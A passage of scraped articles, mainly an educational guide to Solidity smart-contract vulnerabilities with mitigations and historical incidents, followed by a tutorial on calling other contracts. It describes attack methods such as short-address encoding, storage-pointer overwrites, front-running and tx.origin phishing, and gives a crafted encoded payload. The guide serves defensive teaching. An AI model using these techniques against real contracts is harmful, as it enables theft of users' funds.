publish their block and mine another until they find a solution with the block hash being an even number (assuming the block reward and fees are less than $1M). Using past or present variables can be even more devastating as Martin Swende demonstrates in his excellent blog post. Furthermore, using solely block variables mean that the pseudo-random number will be the same for all transactions in a block, so an attacker can multiply their wins by doing many transactions within a block (should there be a maximum bet).Preventative TechniquesThe source of entropy (randomness) must be external to the blockchain. This can be done amongst peers with systems such as commit-reveal, or via changing the trust model to a group of participants (such as in RandDAO). This can also be done via a centralised entity, which acts as a randomness oracle. Block variables (in general, there are some exceptions) should not be used to source entropy as they can be manipulated by miners.Real-World Example: PRNG ContractsArseny Reutov wrote a blog post after he analysed 3649 live smart contracts which were using some sort of pseudo random number generator (PRNG) and found 43 contracts which could be exploited. This post discusses the pitfalls of using block variables as entropy in further detail.7. External Contract ReferencingOne of the benefits of Ethereum global computer is the ability to re-use code and interact with contracts already deployed on the network. As a result, a large number of contracts reference external contracts and in general operation use external message calls to interact with these contracts. These external message calls can mask malicious actors intentions in some non-obvious ways, which we will discuss.The VulnerabilityIn Solidity, any address can be cast as a contract regardless of whether the code at the address represents the contract type being cast. This can be deceiving, especially when the author of the contract is trying to hide malicious code. Let us illustrate this with an example:Consider a piece of code which rudimentarily implements the Rot13 cipher.Rot13Encryption.solThis code simply takes a string (letters a-z, without validation) and encrypts it by shifting each character 13 places to the right (wrapping around \u2018z\u2019); i.e. \u2018a\u2019 shifts to \u2019n\u2019 and \u2018x\u2019 shifts to \u2018k\u2019. The assembly in here is not important, so don\u2019t worry if it doesn\u2019t make any sense at this stage.Consider the following contract which uses this code for its encryptionThe issue with this contract is that the encryptionLibrary address is not public or constant. Thus the deployer of the contract could have given an address in the constructor which points to this contract:which implements the rot26 cipher (shifts each character by 26 places, get it?\u00a0:p). Again, thre is no need to understand the assembly in this contract. The deployer could have also linked the following contract:If the address of either of these contracts were given in the constructor, the encryptPrivateData() function would simply produce an event which prints the unencrypted private data. Although in this example a library-like contract was set in the constructor, it is often the case that a privileged user (such as an owner) can change library contract addresses. If a linked contract doesn't contain the function being called, the fallback function will execute. For example, with the line encryptionLibrary.rot13Encrypt(), if the contract specified by encryptionLibrary was:then an event with the text \u201cHere\u201d would be emitted. Thus if users can alter contract libraries, they can in principle get users to unknowingly run arbitrary code.Note: Don\u2019t use encryption contracts such as these, as the input parameters to smart contracts are visible on the blockchain. Also the Rot cipher is not a recommended encryption technique\u00a0:pPreventative TechniquesAs demonstrated above, vulnerability free contracts can (in some cases) be deployed in such a way that they behave maliciously. An auditor could publicly verify a contract and have it\u2019s owner deploy it in a malicious way, resulting in a publicly audited contract which has vulnerabilities or malicious intent.There are a number of techniques which prevent these scenarios.One technique, is to use the new keyword to create contracts. In the example above, the constructor could be written like:constructor() {        encryptionLibrary = new Rot13Encryption();    }This way an instance of the referenced contract is created at deployment time and the deployer cannot replace the Rot13Encryption contract with anything else without modifying the smart contract.Another solution is to hard code any external contract addresses if they are known.In general, code that calls external contracts should always be looked at carefully. As a developer, when defining external contracts, it can be a good idea to make the contract addresses public (which is not the case in the honey-pot example) to allow users to easily examine which code is being referenced by the contract. Conversely, if a contract has a private variable contract address it can be a sign of someone behaving maliciously (as shown in the real-world example). If a privileged (or any) user is capable of changing a contract address which is used to call external functions, it can be important (in a decentralised system context) to implement a time-lock or voting mechanism to allow users to see which code is being changed or to give participants a chance to opt in/out with the new contract address.Real-World Example: Re-Entrancy Honey\u00a0PotA number of recent honey pots have been released on the main net. These contracts try to outsmart Ethereum hackers who try to exploit the contracts, but who in turn end up getting ether lost to the contract they expect to exploit. One example employs the above attack by replacing an expected contract with a malicious one in the constructor. The code can be found here:This post by one reddit user explains how they lost 1 ether to this contract trying to exploit the re-entrancy bug they expected to be present in the contract.8. Short Address/Parameter AttackThis attack is not specifically performed on Solidity contracts themselves but on third party applications that may interact them. I add this attack for completeness and to be aware of how parameters can be manipulated in contracts.For further reading, see The ERC20 Short Address Attack Explained, ICO Smart contract Vulnerability: Short Address Attackor this reddit post.The VulnerabilityWhen passing parameters to a smart contract, the parameters are encoded according to the ABI specification. It is possible to send encoded parameters that are shorter than the expected parameter length (for example, sending an address that is only 38 hex chars (19 bytes) instead of the standard 40 hex chars (20 bytes)). In such a scenario, the EVM will pad 0\u2019s to the end of the encoded parameters to make up the expected length.This becomes an issue when third party applications do not validate inputs. The clearest example is an exchange which doesn\u2019t verify the address of an ERC20 token when a user requests a withdrawal. This example is covered in more detail in Peter Venesses\u2019 post, The ERC20 Short Address Attack Explained mentioned above.Consider, the standard ERC20 transfer function interface, noting the order of the parameters,function transfer(address to, uint tokens) public returns (bool success);Now consider, an exchange, holding a large amount of a token (let\u2019s say REP) and a user wishes to withdraw their share of 100 tokens. The user would submit their address, 0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddead and the number of tokens, 100. The exchange would encode these parameters in the order specified by the transfer() function, i.e. address then tokens. The encoded result would be a9059cbb000000000000000000000000deaddeaddeaddeaddeaddeaddeaddeaddeaddead0000000000000000000000000000000000000000000000056bc75e2d63100000. The first four bytes (a9059cbb) are the transfer() function signature/selector, the second 32 bytes are the address, followed by the final 32 bytes which represent the uint256 number of tokens. Notice that the hex 56bc75e2d63100000 at the end corresponds to 100 tokens (with 18 decimal places, as specified by the REP token contract).Ok, so now lets look at what happens if we were to send an address that was missing 1 byte (2 hex digits). Specifically, let\u2019s say an attacker sends 0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddeas an address (missing the last two digits) and the same100 tokens to withdraw. If the exchange doesn't validate this input, it would get encoded as a9059cbb000000000000000000000000deaddeaddeaddeaddeaddeaddeaddeaddeadde0000000000000000000000000000000000000000000000056bc75e2d6310000000. The difference is subtle. Note that 00 has been padded to the end of the encoding, to make up for the short address that was sent. When this gets sent to the smart contract, the addressparameters will read as 0xdeaddeaddeaddeaddeaddeaddeaddeaddeadde00 and the value will be read as 56bc75e2d6310000000 (notice the two extra 0's). This value is now, 25600 tokens (the value has been multiplied by 256). In this example, if the exchange held this many tokens, the user would withdraw 25600 tokens (whilst the exchange thinks the user is only withdrawing 100) to the modified address. Obviously the attacker wont posses the modified address in this example, but if the attacker where to generate any address which ended in 0's (which can be easily brute forced) and used this generated address, they could easily steal tokens from the unsuspecting exchange.Preventative TechniquesI suppose it is obvious to say that validating all inputs before sending them to the blockchain will prevent these kinds of attacks. It should also be noted that parameter ordering plays an important role here. As padding only occurs at the end, careful ordering of parameters in the smart contract can potentially mitigate some forms of this attack.Real-World Example:\u00a0UnknownI do not know of any publicised attack of this kind in the wild.9. Unchecked CALL Return\u00a0ValuesThere a number of ways of performing external calls in solidity. Sending ether to external accounts is commonly done via the transfer() method. However, the send() function can also be used and, for more versatile external calls, the CALLopcode can be directly employed in solidity. The call() and send() functions return a boolean indicating if the call succeeded or failed. Thus these functions have a simple caveat, in that the transaction that executes these functions will not revert if the external call (intialised by call() or send()) fails, rather the call() or send() will simply return false. A common pitfall arises when the return value is not checked, rather the developer expects a revert to occur.For further reading, see DASP Top 10 and Scanning Live Ethereum Contracts for the \u201cUnchecked-Send\u201d Bug.The VulnerabilityConsider the following example:This contract represents a Lotto-like contract, where a winner receives winAmount of ether, which typically leaves a little left over for anyone to withdraw.The bug exists on line [11] where a send() is used without checking the response. In this trivial example, a winner whose transaction fails (either by running out of gas, being a contract that intentionally throws in the fallback function or via a call stack depth attack) allows payedOut to be set to true (regardless of whether ether was sent or not). In this case, the public can withdraw the winner's winnings via the withdrawLeftOver() function.Preventative TechniquesWhenever possible, use the transfer() function rather than send() as transfer() will revert if the external transaction reverts. If send() is required, always ensure to check the return value.An even more robust recommendation is to adopt a withdrawal pattern. In this solution, each user is burdened with calling an isolated function (i.e. a withdraw function) which handles the sending of ether out of the contract and therefore independently deals with the consequences of failed send transactions. The idea is to logically isolate the external send functionality from the rest of the code base and place the burden of potentially failed transaction to the end-user who is calling the withdraw function.Real-World Example: Etherpot and King of the\u00a0EtherEtherpot was a smart contract lottery, not too dissimilar to the example contract mentioned above. The solidity code for etherpot, can be found here: lotto.sol. The primary downfall of this contract was due to an incorrect use of block hashes (only the last 256 block hashes are useable, see Aakil Fernandes\u2019s post about how Etherpot failed to implement this correctly). However this contract also suffered from an unchecked call value. Notice the function, cash() on line [80] of lotto.sol:Notice that on line [21] the send function\u2019s return value is not checked, and the following line then sets a boolean indicating the winner has been sent their funds. This bug can allow a state where the winner does not receive their ether, but the state of the contract can indicate that the winner has already been paid.A more serious version of this bug occurred in the King of the Ether. An excellent post-mortem of this contract has been written which details how an unchecked failed send() could be used to attack the contract.10. Race Conditions / Front\u00a0RunningThe combination of external calls to other contracts and the multi-user nature of the underlying blockchain gives rise to a variety of potential Solidity pitfalls whereby users race code execution to obtain unexpected states. Re-Entrancy is one example of such a race condition. In this section we will talk more generally about different kinds of race conditions that can occur on the Ethereum blockchain. There is a variety of good posts on this area, a few are: Ethereum Wiki\u200a\u2014\u200aSafety, DASP\u200a\u2014\u200aFront-Running and the Consensus\u200a\u2014\u200aSmart Contract Best Practices.The VulnerabilityAs with most blockchains, Ethereum nodes pool transactions and form them into blocks. The transactions are only considered valid once a miner has solved a consensus mechanism (currently ETHASH PoW for Ethereum). The miner who solves the block also chooses which transactions from the pool will be included in the block, this is typically ordered by the gasPrice of a transaction. In here lies a potential attack vector. An attacker can watch the transaction pool for transactions which may contain solutions to problems, modify or revoke the attacker's permissions or change a state in a contract which is undesirable for the attacker. The attacker can then get the data from this transaction and create a transaction of their own with a higher gasPrice and get their transaction included in a block before the original.Let\u2019s see how this could work with a simple example. Consider the contractFindThisHash.solImagine this contract contains 1000 ether. The user who can find the pre-image of the sha3 hash 0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a can submit the solution and retrieve the 1000 ether. Lets say one user figures out the solution is Ethereum!. They call solve() with Ethereum! as the parameter. Unfortunately an attacker has been clever enough to watch the transaction pool for anyone submitting a solution. They see this solution, check it's validity, and then submit an equivalent transaction with a much higher gasPrice than the original transaction. The miner who solves the block will likely give the attacker preference due to the higher gasPrice and accept their transaction before the original solver. The attacker will take the 1000 ether and the user who solved the problem will get nothing (there is no ether left in the contract).A more realistic problem comes in the design of the future Casper implementation. The Casper proof of stake contracts invoke slashing conditions where users who notice validators double-voting or misbehaving are incentivised to submit proof that they have done so. The validator will be punished and the user rewarded. In such a scenario, it is expected that miners and users will front-run all such submissions of proof, and this issue must be addressed before the final release.Preventative TechniquesThere are two classes of users who can perform these kinds of front-running attacks. Users (who modify the gasPrice of their transactions) and miners themselves (who can re-order the transactions in a block how they see fit). A contract that is vulnerable to the first class (users), is significantly worse-off than one vulnerable to the second (miners) as miner's can only perform the attack when they solve a block, which is unlikely for any individual miner targeting a specific block. Here I'll list a few mitigation measures with relation to which class of attackers they may prevent.One method that can be employed is to create logic in the contract that places an upper bound on the gasPrice. This prevents users from increasing the gasPrice and getting preferential transaction ordering beyond the upper-bound. This preventative measure only mitigates the first class of attackers (arbitrary users). Miners in this scenario can still attack the contract as they can order the transactions in their block however they like, regardless of gas price.A more robust method is to use a commit-reveal scheme, whenever possible. Such a scheme dictates users send transactions with hidden information (typically a hash). After the transaction has been included in a block, the user sends a transaction revealing the data that was sent (the reveal phase). This method prevents both miners and users from frontrunning transactions as they cannot determine the contents of the transaction. This method however, cannot conceal the transaction value (which in some cases is the valuable information that needs to be hidden). The ENS smart contract allowed users to send transactions, whose committed data included the amount of ether they were willing to spend. Users could then send transactions of arbitrary value. During the reveal phase, users were refunded the difference between the amount sent in the transaction and the amount they were willing to spend.A further suggestion by Lorenz, Phil, Ari and Florian is to use Submarine Sends. An efficient implementation of this idea requires the CREATE2 opcode, which currently hasn't been adopted, but seems likely in upcoming hard forks.Real-World Examples: ERC20 and\u00a0BancorThe ERC20 standard is quite well-known for building tokens on Ethereum. This standard has a potential frontrunning vulnerability which comes about due to the approve() function. A good explanation of this vulnerability can be found here.The standard specifies the approve() function as:function approve(address _spender, uint256 _value) returns (bool success)This function allows a user to permit other users to transfer tokens on their behalf. The frontrunning vulnerability comes in the scenario when a user, Alice, approves her friend, Bob to spend 100 tokens. Alice later decides that she wants to revoke Bob's approval to spend 100 tokens, so she creates a transaction that sets Bob's allocation to 50 tokens. Bob, who has been carefully watching the chain, sees this transaction and builds a transaction of his own spending the 100 tokens. He puts a higher gasPrice on his transaction than Alice's and gets his transaction prioritised over hers. Some implementations of approve() would allow Bob to transfer his 100 tokens, then when Alice's transaction gets committed, resets Bob's approval to 50 tokens, in effect giving Bob access to 150 tokens. The mitigation strategies of this attack are given here in the document linked above.Another prominent, real-world example is Bancor. Ivan Bogatty and his team documented a profitable attack on the initial Bancor implementation. His blog post and Devon 3 talk discuss in detail how this was done. Essentially, prices of tokens are determined based on transaction value, users can watch the transaction pool for Bancor transactions and front run them to profit from the price differences. This attack has been addressed by the Bancor team.11. Denial Of Service\u00a0(DOS)This category is very broad, but fundamentally consists of attacks where users can leave the contract inoperable for a small period of time, or in some cases, permanently. This can trap ether in these contracts forever, as was the case with the Second Parity MultiSig hackThe VulnerabilityThere are various ways a contract can become inoperable. Here I will only highlight some potentially less-obvious Blockchain nuanced Solidity coding patterns that can lead to attackers performing DOS attacks.Looping through externally manipulated mappings or arrays\u200a\u2014\u200aIn my adventures I\u2019ve seen various forms of this kind of pattern. Typically it appears in scenarios where an owner wishes to distribute tokens amongst their investors, and do so with a distribute()-like function as can be seen in the example contract:Notice that the loop in this contract runs over an array which can be artificially inflated. An attacker can create many user accounts making the investor array large. In principle this can be done such that the gas required to execute the for loop exceeds the block gas limit, essentially making the distribute() function inoperable.2. Owner operations\u200a\u2014\u200aAnother common pattern is where owner\u2019s have specific privileges in contracts and must perform some task in order for the contract to proceed to the next state. One example would be an ICO contract that requires the owner to finalize() the contract which then allows tokens to be transferable, i.e.In such cases, if a privileged user loses their private keys, or becomes inactive, the entire token contract becomes inoperable. In this case, if the owner cannot call finalize() no tokens can be transferred; i.e. the entire operation of the token ecosystem hinges on a single address.3. Progressing state based on external calls\u200a\u2014\u200aContracts are sometimes written such that in order to progress to a new state requires sending ether to an address, or waiting for some input from an external source. These patterns can lead to DOS attacks, when the external call fails, or is prevented for external reasons. In the example of sending ether, a user can create a contract which doesn\u2019t accept ether. If a contract needs to send ether to this address in order to progress to a new state, the contract will never achieve the new state as ether can never be sent to the contract.Preventative TechniquesIn the first example, contracts should not loop through data structures that can be artificially manipulated by external users. A withdrawal pattern is recommended, whereby each of the investors call a withdraw function to claim tokens independently.In the second example a privileged user was required to change the state of the contract. In such examples (wherever possible) a fail-safe can be used in the event that the owner becomes incapacitated. One solution could be setting up the owner as a multisig contract. Another solution is to use a timelock, where the require on line [13] could include a time-based mechanism, such as require(msg.sender == owner || now > unlockTime) which allows any user to finalise after a period of time, specified by unlockTime. This kind of mitigation technique can be used in the third example also. If external calls are required to progress to a new state, account for their possible failure and potentially add a time-based state progression in the event that the desired call never comes.Note: Of course there are centralised alternatives to these suggestions where one can add a maintenanceUser who can come along and fix problems with DOS-based attack vectors if need be. Typically these kinds of contracts contain trust issues over the power of such an entity, but that is not a conversation for this section.Real-World Examples: GovernMentalGovernMental was an old Ponzi scheme that accumulated quite a large amount of ether. In fact, at one point it had accumulated 1100 ether. Unfortunately, it was susceptible to the DOS vulnerabilities mentioned in this section. This Reddit Post describes how the contract required the deletion of a large mapping in order to withdraw the ether. The deletion of this mapping had a gas cost that exceeded the block gas limit at the time, and thus was not possible to withdraw the 1100 ether. The contract address is 0xF45717552f12Ef7cb65e95476F217Ea008167Ae3 and you can see from transaction 0x0d80d67202bd9cb6773df8dd2020e7190a1b0793e8ec4fc105257e8128f0506b that the 1100 ether was finally obtained with a transaction that used 2.5M gas.12. Block Timestamp ManipulationBlock timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion section for further details), locking funds for periods of time and various state-changing conditional statements that are time-dependent. Miner\u2019s have the ability to adjust timestamps slightly which can prove to be quite dangerous if block timestamps are used incorrectly in smart contracts.Some useful references for this are: The Solidity Docs, this Stack Exchange Question,The Vulnerabilityblock.timestamp or its alias now can be manipulated by miners if they have some incentive to do so. Lets construct a simple game, which would be vulnerable to miner exploitation,Roulette.solThis contract behaves like a simple lottery. One transaction per block can bet 10 ether for a chance to win the balance of the contract. The assumption here is that, block.timestamp is uniformly distributed about the last two digits. If that were the case, there would be a 1/15 chance of winning this lottery.However, as we know, miners can adjust the timestamp, should they need to. In this particular case, if enough ether pooled in the contract, a miner who solves a block is incentivised to choose a timestamp such that block.timestamp or now modulo 15 is 0. In doing so they may win the ether locked in this contract along with the block reward. As there is only one person allowed to bet per block, this is also vulnerable to front-running attacks.In practice, block timestamps are monotonically increasing and so miners cannot choose arbitrary block timestamps (they must be larger than their predecessors). They are also limited to setting blocktimes not too far in the future as these blocks will likely be rejected by the network (nodes will not validate blocks whose timestamps are in the future).Preventative TechniquesBlock timestamps should not be used for entropy or generating random numbers\u200a\u2014\u200ai.e. they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state (if assumed to be random).Time-sensitive logic is sometimes required; i.e. unlocking contracts (timelocking), completing an ICO after a few weeks or enforcing expiry dates. It is sometimes recommend to use block.number (see the Solidity docs) and an average block time to estimate times;\u00a0.i.e. 1 week with a 10 second block time, equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure as miners are unable to manipulate the block number as easily. The BAT ICO contract employed this strategy.This can be unnecessary if contracts aren\u2019t particularly concerned with miner manipulations of the block timestamp, but it is something to be aware of when developing contracts.Real-World Example: GovernMentalGovernMental was an old Ponzi scheme that accumulated quite a large amount of ether. It was also vulnerable to a timestamp-based attack. The contract payed out to the player who was the last player to join (for at least one minute) in a round. Thus, a miner who was a player, could adjust the timestamp (to a future time, to make it look like a minute had elapsed) to make it appear that the player was the last to join for over a minute (even though this is not true in reality). More detail on this can be found in the History of Ethereum Security Vulnerabilities Post by Tanya Bahrynovska.13. Constructors with\u00a0CareConstructors are special functions which often perform critical, privileged tasks when initialising contracts. Before solidity v0.4.22 constructors were defined as functions that had the same name as the contract that contained them. Thus, when a contract name gets changed in development, if the constructor name isn't changed, it becomes a normal, callable function. As you can imagine, this can (and has) lead to some interesting contract hacks.For further reading, I suggest the reader attempt the Ethernaught Challenges (in particular the Fallout level).The VulnerabilityIf the contract name gets modified, or there is a typo in the constructors name such that it no longer matches the name of the contract, the constructor will behave like a normal function. This can lead to dire consequences, especially if the constructor is performing privileged operations. Consider the following contractThis contract collects ether and only allows the owner to withdraw all the ether by calling the withdraw() function. The issue arises due to the fact that the constructor is not exactly named after the contract. Specifically, ownerWallet is not the same as OwnerWallet. Thus, any user can call the ownerWallet() function, set themselves as the owner and then take all the ether in the contract by calling withdraw().Preventative TechniquesThis issue has been primarily addressed in the Solidity compiler in version 0.4.22. This version introduced a constructorkeyword which specifies the constructor, rather than requiring the name of the function to match the contract name. Using this keyword to specify constructors is recommended to prevent naming issues as highlighted above.Real-World Example:\u00a0RubixiRubixi (contract code) was another pyramid scheme that exhibited this kind of vulnerability. It was originally called DynamicPyramid but the contract name was changed before deployment to Rubixi. The constructor's name wasn't changed, allowing any user to become the creator. Some interesting discussion related to this bug can be found on this Bitcoin Thread. Ultimately, it allowed users to fight for creator status to claim the fees from the pyramid scheme. More detail on this particular bug can be found here.14. Unintialised Storage\u00a0PointersThe EVM stores data either as storage or as memory. Understanding exactly how this is done and the default types for local variables of functions is highly recommended when developing contracts. This is because it is possible to produce vulnerable contracts by inappropriately intialising variables.To read more about storage and memory in the EVM, see the Solidity Docs: Data Location, Solidity Docs: Layout of State Variables in Storage, Solidity Docs: Layout in Memory.This section is based off the excellent post by Stefan Beyer. Further reading on this topic can be found from Sefan\u2019s inspiration, which is this reddit thread.The VulnerabilityLocal variables within functions default to storage or memory depending on their type. Uninitialised local storage variables can point to other unexpected storage variables in the contract, leading to intentional (i.e. the developer intentionally puts them there to attack later) or unintentional vulnerabilities.Let\u2019s consider the following, relatively simple name registrar contract:This simple name registrar has only one function. When the contract is unlocked, it allows anyone to register a name (as a bytes32 hash) and map that name to an address. Unfortunately, this registrar is initially locked and the require on line [23] prevents register() from adding name records. There is however a vulnerability in this contract, that allows name registration regardless of the unlocked variable.To discuss this vulnerability, first we need to understand how storage works in Solidity. As a high level overview (without any proper technical detail\u200a\u2014\u200aI suggest reading the Solidity docs for a proper review), state variables are stored sequentially in slotsas they appear in the contract (they can be grouped together, but not in this example, so we wont worry about that). Thus, unlocked exists in slot 0, registeredNameRecord exists in slot 1 and resolve in slot 2 etc. Each of these slots are of byte size 32 (there are added complexities with mappings which we ignore for now). The boolean unlocked will look like 0x000...0 (64 0's, excluding the 0x) for false or 0x000...1(63 0's) for true. As you can see, there is a significant waste of storage in this particular example.The next piece of information that we need, is that Solidity defaults complex data types, such as structs, to storage when initialising them as local variables. Therefore, newRecord on line [16] defaults to storage. The vulnerability is caused by the fact that newRecord is not initialised. Because it defaults to storage, it becomes a pointer to storage and because it is uninitialised, it points to slot 0 (i.e. where unlocked is stored). Notice that on lines [17] and [18] we then set nameRecord.name to _name and nameRecord.mappedAddress to _mappedAddress, this in effect changes the storage location of slot 0 and slot 1 which modifies both unlocked and the storage slot associated with registeredNameRecord.This means that unlocked can be directly modified, simply by the bytes32 _name parameter of the register() function. Therefore, if the last byte of _name is non-zero, it will modify the last byte of storage slot 0 and directly change unlockedto true. Such _name values will pass the require() on line [23] as we are setting unlocked to true. Try this in Remix. Notice the function will pass if you use a _name of the form: 0x0000000000000000000000000000000000000000000000000000000000000001Preventative TechniquesThe Solidity compiler raises unintialised storage variables as warnings, thus developers should pay careful attention to these warnings when building smart contracts. The current version of mist (0.10), doesn\u2019t allow these contracts to be compiled. It is often good practice to explicitly use the memory or storage when dealing with complex types to ensure they behave as expected.Real-World Examples: Honey Pots: OpenAddressLottery and CryptoRouletteA honey pot named OpenAddressLottery (contract code) was deployed that used this uninitialised storage variable querk to collect ether from some would-be hackers. The contract is rather in-depth, so I will leave the discussion to this reddit threadwhere the attack is quite clearly explained.Another honey pot, CryptoRoulette (contract code) also utilises this trick to try and collect some ether. If you can\u2019t figure out how the attack works, see An analysis of a couple Ethereum honeypot contracts for an overview of this contract and others.15. Floating Points and PrecisionAs of this writing (Solidity v0.4.24), fixed point or floating point numbers are not supported. This means that floating point representations must be made with the integer types in Solidity. This can lead to errors/vulnerabilities if not implemented correctly.For further reading, see Ethereum Contract Security Techniques and Tips\u200a\u2014\u200aRounding with Integer Division,The VulnerabilityAs there is no fixed point type in Solidity, developers are required to implement their own using the standard integer data types. There are a number of pitfalls developers can run into during this process. I will try to highlight some of these in this section.Lets begin with a code example (lets ignore any over/under flow issues for simplicity).This simple token buying/selling contract has some obvious problems in the buying and selling of tokens. Although the mathematical calculations for buying and selling tokens are correct, the lack of floating point numbers will give erroneous results. For example, when buying tokens on line [7], if the value is less than 1 ether the initial division will result in 0, leaving the final multiplication 0 (i.e. 200 wei divided by 1e18 weiPerEth equals 0). Similarly, when selling tokens, any tokens less than 10 will also result in 0 ether. In fact, rounding here is always down, so selling 29 tokens, will result in 2 ether.The issue with this contract is that the precision is only to the nearest ether (i.e. 1e18 wei). This can sometimes get tricky when dealing with decimals in ERC20 tokens when you need higher precisions.Preventative TechniquesKeeping the right precision in your smart contracts is very important, especially when dealing ratios and rates which reflect economic decisions.You should ensure that any ratios or rates you are using allow for large numerators in fractions. For example, we used the rate tokensPerEth in our example. It would have been better to use weiPerTokens which would be a large number. To solve for the amount of tokens we could do msg.sender/weiPerTokens. This would give a more precise result.Another tactic to keep in mind, is to be mindful of order of operations. In the above example, the calculation to purchase tokens was msg.value/weiPerEth*tokenPerEth. Notice that the division occurs before the multiplication. This example would have achieved a greater precision if the calculation performed the multiplication first and then the division, i.e. msg.value*tokenPerEth/weiPerEth.Finally, when defining arbitrary precision for numbers it can be a good idea to convert variables into higher precision, perform all mathematical operations, then finally when needed, convert back down to the precision for output. Typically uint256's are used (as they are optimal for gas usage) which give approximately 60 orders of magnitude in their range, some which can be dedicated to the precision of mathematical operations. It may be the case that it is better to keep all variables in high precision in solidity and convert back to lower precisions in external apps (this is essentially how the decimals variable works in ERC20 Token contracts). To see examples of how this can be done and the libraries to do this, I recommend looking at the Maker DAO DSMath. They use some funky naming, WAD's and RAY's but the concept is useful.Real-World Example:\u00a0EthstickI couldn\u2019t find a good example where rounding has caused a severe issue in a contract, but I\u2019m sure there are plenty out there. Feel free to update this if you have a good one in mind.For lack of a good example, I want to draw your attention to Ethstick mainly because I like the cool naming within the contract. This contract doesn\u2019t use any extended precision, however, it deals with wei. So this contract will have issues of rounding, but only at the wei level of precision. It has some more serious flaws, but these are relating back to the difficulty in getting entropy on the blockchain (see Entropty Illusion). For a further discussion on the Ethstick contract, I'll refer you to another post of Peter Venesses, Ethereum Contracts Are Going to be Candy For Hackers.16. Tx.Origin AuthenticationSolidity has a global variable, tx.origin which traverses the entire call stack and returns the address of the account that originally sent the call (or transaction). Using this variable for authentication in smart contracts leaves the contract vulnerable to a phishing-like attack.For further reading, see Stack Exchange Question, Peter Venesses\u2019s Blog and Solidity\u200a\u2014\u200aTx.Origin attacks.The VulnerabilityContracts that authorise users using the tx.origin variable are typically vulnerable to phishing attacks which can trick users into performing authenticated actions on the vulnerable contract.Consider the simple contract,Notice that on line [11] this contract authorises the withdrawAll() function using tx.origin. This contract allows for an attacker to create an attacking contract of the form,To utilise this contract, an attacker would deploy it, and then convince the owner of the Phishable contract to send this contract some amount of ether. The attacker may disguise this contract as their own private address and social engineer the victim to send some form of transaction to the address. The victim, unless being careful, may not notice that there is code at the attacker's address, or the attacker may pass it off as being a multisignature wallet or some advanced storage wallet.In any case, if the victim sends a transaction (with enough gas) to the AttackContract address, it will invoke the fallback function, which in turn calls the withdrawAll() function of the Phishable contract, with the parameter attacker. This will result in the withdrawal of all funds from the Phishable contract to the attacker address. This is because the address that first initialised the call was the victim (i.e. the owner of the Phishable contract). Therefore, tx.origin will be equal to owner and the require on line [11] of the Phishable contract will pass.Preventative Techniquestx.origin should not be used for authorisation in smart contracts. This isn't to say that the tx.origin variable should never be used. It does have some legitimate use cases in smart contracts. For example, if one wanted to deny external contracts from calling the current contract, they could implement a require of the from require(tx.origin == msg.sender). This prevents intermediate contracts being used to call the current contract, limiting the contract to regular code-less addresses.Real-World Example: Not\u00a0KnownI do not know of any publicised exploits of this form in the wild.", "responses": "8"}, {"title": "Calling the Function of Another Contract in\u00a0Solidity", "author_name": "Bernard Peh", "link": "https://medium.com/@blockchain101/calling-the-function-of-another-contract-in-solidity-f9edfa921f4c?source=search_post", "post_date": "Mar 5, 2018", "readtime": "3 min read", "upvotes": "963", "content": "Calling the Function of Another Contract in\u00a0SolidityBernard PehBlockedUnblockFollowFollowingMar 5, 2018When we write Smart Contracts, we can write it in such a way that they can interact with existing deployed contracts. This feature is very powerful as it allows code reusability, ie treating deployed contracts like libraries. There has been a lot of effort done in this space but is still controversial at the time of writing. For example what would happen if the reused contracts are faulty (just like what happened to parity multi-sig wallet hack)?In this article, I am not debating about the immutability of deployed contracts or whether we should or should not interact with deployed contracts. Instead, I will be focusing on the different techniques to call functions of deployed contracts. I can see some use cases for it and I\u2019ll leave it up to the readers to implement what they believe in.Let\u2019s say we have deployed a very simple contract called \u201cDeployed\u201d that allows user to set a variable.pragma solidity ^0.4.18;contract Deployed {    uint public a = 1;        function setA(uint _a) public returns (uint) {        a = _a;        return a;    }    }and we want to deploy another contract later called \u201cExisting\u201d to change the variable of \u201ca\u201d in the \u201cDeployed\u201d contract.pragma solidity ^0.4.18;contract Deployed {        function setA(uint) public returns (uint) {}        function a() public pure returns (uint) {}    }contract Existing  {        Deployed dc;        function Existing(address _t) public {        dc = Deployed(_t);    }     function getA() public view returns (uint result) {        return dc.a();    }        function setA(uint _val) public returns (uint result) {        dc.setA(_val);        return _val;    }    }We do not need the full implementation of the \u201cDeployed\u201d contract, but rather just the function signatures as required by the ABI. Since we have the address of the \u201cDeployed\u201d contract, we could initialised the \u201cExisting\u201d contract with the address and interact with the \u201cDeployed\u201d contract using the existing setA and getA functions accordingly.This is easy and actually the recommended way to interact with deployed contracts. However, what if we don\u2019t have the ABI of the deployed contract? We can still call the \u201csetA\u201d function of the deployed contract.pragma solidity ^0.4.18;contract ExistingWithoutABI  {        address dc;        function ExistingWithoutABI(address _t) public {        dc = _t;    }        function setA_Signature(uint _val) public returns(bool success){        require(dc.call(bytes4(keccak256(\"setA(uint256)\")),_val));        return true;    }}Function signatures are 4 bytes long and the formula to generate it is to hash it with the keccak256 function, like so:bytes4(keccak256(\u201csetA(uint256)\u201d))We could pass a value to setA inside the call method. However, since the call (as well as delegatecall) method simply passes value over to the contract address and will not get any returned value, it doesn\u2019t know if setA has done its job correctly or not unless we check out the state of the \u201cDelegate\u201d contract.What if we want to get the returned value from setA? Unfortunately, there is no way to do that unless we use solidity\u2019s assembly code. Are you ready?pragma solidity ^0.4.18;contract ExistingWithoutABI  {        address dc;        function ExistingWithoutABI(address _t) public {        dc = _t;    }        function setA_ASM(uint _val) public returns (uint answer) {                bytes4 sig = bytes4(keccak256(\"setA(uint256)\"));        assembly {            // move pointer to free memory spot            let ptr := mload(0x40)            // put function sig at memory spot            mstore(ptr,sig)            // append argument after function sig            mstore(add(ptr,0x04), _val)            let result := call(              15000, // gas limit              sload(dc_slot),  // to addr. append var to _slot to access storage variable              0, // not transfer any ether              ptr, // Inputs are stored at location ptr              0x24, // Inputs are 36 bytes long              ptr,  //Store output over input              0x20) //Outputs are 32 bytes long                        if eq(result, 0) {                revert(0, 0)            }                        answer := mload(ptr) // Assign output to answer var            mstore(0x40,add(ptr,0x24)) // Set storage pointer to new space        }    }}Solidity\u2019s assembly code starts with the \u201cassembly\u201d keyword and wrapped in 